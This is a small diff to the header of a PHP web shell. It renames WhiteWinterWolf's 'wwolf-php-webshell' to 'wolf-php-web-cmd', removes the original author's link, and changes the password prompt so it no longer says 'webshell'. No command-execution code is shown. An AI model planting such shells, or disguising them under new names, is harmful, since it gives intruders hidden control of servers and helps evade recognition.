@@ -1,11 +1,11 @@
 #<?php
 /*******************************************************************************
- * Copyright 2017 WhiteWinterWolf
- * https://www.whitewinterwolf.com/tags/php-webshell/
+ * Copyright 2022 wolf-php-web-cmd
+ * 
  *
- * This file is part of wwolf-php-webshell.
+ * This file is part of wolf-php-web-cmd
  *
- * wwwolf-php-webshell is free software: you can redistribute it and/or modify
+ * wolf-php-web-cmd is free software: you can redistribute it and/or modify
  * it under the terms of the GNU General Public License as published by
  * the Free Software Foundation, either version 3 of the License, or
  * (at your option) any later version.
@@ -24,7 +24,7 @@
  * Use the 'passhash.sh' script to generate the hash.
  * NOTE: the prompt value is tied to the hash!
  */
-$passprompt = "WhiteWinterWolf's PHP webshell: ";
+$passprompt = "wolf's PHP web cmd: ";
 $passhash = "";
 
 function e($s) { echo htmlspecialchars($s, ENT_QUOTES); }
